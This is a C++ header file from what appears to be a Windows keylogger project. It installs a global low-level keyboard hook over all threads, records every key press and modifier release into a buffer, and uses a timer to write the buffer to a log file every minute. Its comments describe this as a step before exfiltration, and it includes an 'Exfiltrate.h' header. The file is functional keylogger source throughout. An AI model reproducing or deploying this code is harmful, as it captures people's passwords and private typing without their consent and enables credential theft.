#ifndef APIHOOK_H
#define APIHOOK_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "Keyboard.h"
#include "Timer.h"
#include "Exfiltrate.h"

namespace APIHook
{

	HHOOK keyboardHook = NULL;
	std::string workingKeyLog = "";

	void preExfilProcedure()
	{
		if (workingKeyLog.empty())
		{
			Auxiliary::logError("preExfilProcedure() - Nothing was logged into the temp workingKeyLog!");
			return;
		}
		
		std::string updatedKeyLogFile = IO::writeToLog(workingKeyLog);
		Auxiliary::logError("preExfilProcedure() - workingKeyLog has been pushed to key log file!");
		
		if (updatedKeyLogFile.empty())
		{
			Auxiliary::logError("preExfilProcedure() - IO::writeToLog() had some issues creating the log file!");
		}
		else
		{
			Auxiliary::logError("preExfilProcedure() - A new key log file has been generated!");
		}

		//Add if/else functionality here to check for successful exfiltration before clearing workingKeyLog

		workingKeyLog = "";
	}

	//Change exfiltration interval here...remember...time is in miliseconds!

	Timer logExfilTimer(preExfilProcedure, 1000 * 60, Timer::Infinite);

	/* The hookingProcedure() function is used with the SetWindowsHookEx() function. 
	The system calls this function every time a new keyboard input event is about 
	to be posted into a thread input queue. 
	
	First we pass in an nCode which is used to determine how to process the message.
	If nCode is less than 0, the hook procedure must pass the message to CallNextHookEx()
	without further processing and should return what is returned by it. 
	
	Lastly, wParam is just an id for the keyboard message 
	and lParam is a pointer to a KBDLLHOOK strcuture. 
	
	If nCode is less than zero, the hook procedure must return the value returned by CallNextHookEx(), 
	otherwise, other applications that have installed WH_KEYBOARD_LL hooks will not receive hook notifications 
	and may behave incorrectly as a result. 
	
	If the hook procedure processed the message, it may return a nonzero value to prevent the system
	from passing the message to the rest of the hook chain or the target window procedure. */

	LRESULT hookingProcedure(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (nCode < 0)
		{
			CallNextHookEx(keyboardHook, nCode, wParam, lParam);
		}

		KBDLLHOOKSTRUCT* keyPress = (KBDLLHOOKSTRUCT*)lParam;
		
		/*	
			WM_KEYDOWN is when a regular key is pressed (i.e caps lock, a, b, c)
			WM_SYSKEYDOWN is when combination keys or system buttons are pressed (i.e alt+tab, win) 
			WM_KEYUP is when a regular key is released
			WM_SYSKEYUP is when a system key is released
		*/

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			if (keyPress->vkCode == VK_RETURN)
			{
				//Handle enter key in the log for formatting purposes

				workingKeyLog += '\n';
			}
			else
			{
				workingKeyLog += KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
			}
		}
		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
		{
			int keyCode = keyPress->vkCode;

			//If any of the following specific system keys are released...

			if (
				keyCode == VK_CONTROL ||
				keyCode == VK_LCONTROL ||
				keyCode == VK_RCONTROL ||
				keyCode == VK_SHIFT ||
				keyCode == VK_RSHIFT ||
				keyCode == VK_LSHIFT ||
				keyCode == VK_MENU ||
				keyCode == VK_LMENU ||
				keyCode == VK_RMENU
				//keyCode == VK_CAPITAL ||
				//keyCode == VK_NUMLOCK ||
				//keyCode == VK_LWIN ||
				//keyCode == VK_RWIN
				)
			{
				//Indicate so in the log [/SHIFT], otherwise we don't care about a, b, or c being released

				std::string keyName = KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
				keyName.insert(2, "/");
				workingKeyLog += keyName;
			}
		}

		return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
	}

	//This function will be used to hook into the keyboard.

	void installHook()
	{
		/* Here, we are hooking into the internal Windows message-transport system using the
		SetWindowsHookEx() function. We pass in the hook code 13, which is a low-level keyboard hook.
		Then we pass in a pointer (HOOKPROC) to the hooking procedure function and a garbage handle
		to a null object. Finally, we pass in the id of the thread with which the hook procedure 
		is to be associated (basically all existing threads if 0). */

		keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookingProcedure, GetModuleHandle(NULL), 0);

		if (keyboardHook == NULL)
		{
			Auxiliary::logError("API::installHook() - Windows keyboard hook could not be installed!");
		}
		else
		{
			logExfilTimer.startTimer(true);
			Auxiliary::logError("API::installHook() - Windows keyboard hook installed!");
			Auxiliary::logError("API::installHook() - Log exfiltration timer has begun!");

		}
	}

	//This function will be used to remove our keyboard hook

	void uninstallHook()
	{
		//Here we pass an HHOOK to UnhookWindowsHookEx() in order to have it removed

		UnhookWindowsHookEx(keyboardHook);

		Auxiliary::logError("API::uninstallHook() - Windows keyboard hook uninstalled!");
		
		//Restore the HHOOK to NULL so the isHooked() function works
		
		keyboardHook = NULL;
	}

	//Status checking for the keyboard hook

	bool isHooked()
	{
		if (keyboardHook != NULL)
		{
			return true;
		}
		else
		{
			return false;
		}
	}

}
#endif // !APIHOOK_H
